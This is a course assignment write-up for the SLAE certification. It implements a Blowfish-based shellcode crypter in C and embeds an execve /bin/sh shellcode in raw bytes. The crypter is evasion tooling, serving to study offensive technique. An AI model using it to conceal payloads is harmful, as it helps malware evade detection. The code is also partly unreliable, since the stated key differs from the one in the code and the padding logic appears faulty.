# Assignment 7

## What to do
- Create a custom crypter
- Free to use any existing encryption schemas

In this assignment Blowfish cipher is implemented in C language. Further information regarding Blowfish cipher can be found in the following links:

https://www.schneier.com/academic/archives/1994/09/description_of_a_new.html
https://en.wikipedia.org/wiki/Blowfish_(cipher)

This implementation is customizable. Different shellcodes can be encrypted using another key in each case.

The shellcode used is the execve /bin/sh shellcode:
> \x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80

and is placed in the char array named _shellcode_.

The encryption key used in this implementation is the word _testkey_ and is placed in a char array named _key_.



```c
/*

	Design decisions
	block size: 64-bit = 8 bytes

*/

#include<stdio.h>
#include<stdint.h>
#include<stdlib.h>

#include"blowfish.h"

int paddingneeded(uint32_t len, uint32_t blocksize)
{
	// calculate the needed padding
	uint32_t padding=0;

	padding = len % blocksize;
	if (padding != 0)
		padding = blocksize - padding;

	return padding;
}

void swap(uint32_t *L, uint32_t *R)
{
	uint32_t temp;

	temp = *L;
	*L = *R;
	*R = temp;
}

int stringlen(uint8_t *s)
{
	// calculate the length of char array
	int i=0, len=0;

	while (s[i++] != '\0')
		len++;

	return len;
}


uint32_t f(uint32_t x)
{
        uint32_t h = S[0][x>>24] + S[1][x>>16 & 0xff];
        return (h ^ S[2][x>>8 & 0xff]) + S[3][x & 0xff];
}


void encrypt(uint32_t *L, uint32_t *R)
{
	uint32_t i;

	for (i=0; i<16; i+=2)
	{
		*L ^= P[i];
		*R ^= f(*L);
		*R ^= P[i+1];
		*L ^= f(*R);
	}
	*L ^= P[16];
	*R ^= P[17];
	swap(L, R);

}


void decrypt(uint32_t *L, uint32_t *R)
{
	uint32_t i;

	for (i=16; i>0; i-=2)
	{
		*L ^= P[i+1];
		*R ^= f(*L);
		*R ^= P[i];
		*L ^= f(*R);
	}
	*L ^= P[1];
	*R ^= P[0];
	swap(L, R);
}


void initialization(uint32_t keypaddedlength, uint32_t *keypadded)
{
	int i, j;

	for (i=0; i<18; i++)
	{
		P[i] ^= keypadded[i % keypaddedlength];
	}

	uint32_t L=0, R=0;

	for (i=0; i<18; i+=2)
	{
		encrypt(&L,&R);
		P[i] = L;
		P[i+1] = R;
	}

	for (i=0; i<4; ++i)
		for (j=0; j<256; j+=2)
	{
		encrypt(&L,&R);
		S[i][j] = L;
		S[i][j+1] = R;
	}
}


int main(uint32_t argc, uint8_t **argv)
{

	uint8_t *shellcode = "\x31\xc9\xf7\xe1\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";
	uint8_t *newshellcode;		// padded shellcode
	uint32_t i, j, length = 0;	// shellcode's length
	uint32_t newlength = 0;		// # new length of shellcode
	uint32_t padding = 0;		// number of padding chars
	uint8_t padchar = '\x90';	// padding character for the shellcode
	uint32_t blocks = 0;		// # of 32-bit = 4 bytes blocks (half 64bit)

	uint8_t *key = "testke";	// encryption key - CHANGE ME
	uint32_t keylength;		// key length
	uint32_t keypad;
	uint32_t keypaddedlength;	// number of 32bit cells

	uint32_t L;
	uint32_t R;


	keylength = stringlen(key);	// # number of characters in key
	printf("[+] keylength: %d\n", keylength);

	keypad = paddingneeded(keylength, 4);		// # of character to be added to key
	printf("[+] keypad needed: %d\n", keypad);

	keypaddedlength = (keylength+keypad)/4;

	// allocate memory for padded key
	uint32_t *keypadded = (uint32_t *)malloc(sizeof(uint32_t)*keypaddedlength);

	j=0;
	for (i=0; i<keypaddedlength; i++)
	{
		keypadded[i] = key[(j+3)%keylength] | (key[(j+2)%keylength] << 8) | (key[(j+1)%keylength] << 16) | (key[j%keylength] << 24);
		j +=4;
	}

	length = stringlen(shellcode);			// shellcode's length
	padding = paddingneeded(length, 8);		// # of padding characters needed
	printf("[+] Padding of: %d byte(s) is needed\n", padding);

	newlength = length + padding;			// shellcode's newlength (after padding or not)

	newshellcode = (uint8_t *)malloc(sizeof(uint8_t)*newlength);

	// little-endian to big-endian and padding
	j = 3;
	uint32_t zot = length - (length % 4);
	uint32_t k=0, l=0;
	for (i=0; i<newlength; i++)
	{
		if ( i%4 == 0)
			j=3;
		if (i< zot)
		{
			newshellcode[i] = shellcode[i+j];
			j -= 2;
		}
		else if ( zot <= i < length)
			if ( k < (length % 4) )
			{
				newshellcode[newlength-1-k] = shellcode[i];
				k++;
			}
		else
			if ( l < padding )
			{
				newshellcode[i-(length%4)] = padchar;
				l++;
			}
	}

	blocks = newlength/4;				// # of 32bit blocks
	printf("[+] number of 32-bit blocks: %d\n", blocks);

	uint32_t Low=0, High=0;

	initialization(keypaddedlength, keypadded);

	// create array for the encrypted shellcode
	uint8_t *tmpshell = (uint8_t *)malloc(sizeof(uint8_t)*newlength);
	uint32_t *shellint = (uint32_t *)malloc(sizeof(uint32_t)*blocks);

	//encryption
	k=0;
	for (i=0; i<blocks; i +=2)
	{
		Low = *((uint32_t *)newshellcode + i);
		High = *((uint32_t *)newshellcode + i + 1);

		encrypt(&Low, &High);

		shellint[i] = Low;
		shellint[i+1] = High;

		tmpshell[k+3] = (Low >> 24) & 0xff;
		tmpshell[k+2] = (Low >> 16) & 0xff;
		tmpshell[k+1] = (Low >> 8) & 0xff;
		tmpshell[k] = Low & 0xff;

		tmpshell[k+7] = (High >> 24) & 0xff;
		tmpshell[k+6] = (High >> 16) & 0xff;
		tmpshell[k+5] = (High >> 8) & 0xff;
		tmpshell[k+4] = High & 0xff;
		k += 8;
	}

	// print encrypted shellcode
	printf("[+] Encrypted shellcode: ");
	for (i=0; i<newlength; i++)
		printf("\\x%02x", tmpshell[i]);
	printf("\n");

	// decryption
	k=0;
	for (i=0; i<blocks; i+=2)
	{
		decrypt(&shellint[i], &shellint[i+1]);

		tmpshell[k] = (shellint[i] >> 24) & 0xff;
		tmpshell[k+1] = (shellint[i] >> 16) & 0xff;
		tmpshell[k+2] = (shellint[i] >> 8) & 0xff;
		tmpshell[k+3] = shellint[i] & 0xff;

		tmpshell[k+4] = (shellint[i+1] >> 24) & 0xff;
		tmpshell[k+5] = (shellint[i+1] >> 16) & 0xff;
		tmpshell[k+6] = (shellint[i+1] >> 8) & 0xff;
		tmpshell[k+7] = shellint[i+1] & 0xff;
		k += 8;
	}

	// print decrypted shellcode
	printf("[+] Decrypted shellcode: ");
	for (i=0; i<length; i++)
		printf("\\x%02x", tmpshell[i]);
	printf("\n");

	return 0;

}
```

## Statement
This page has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

Student-ID: SLAE-998
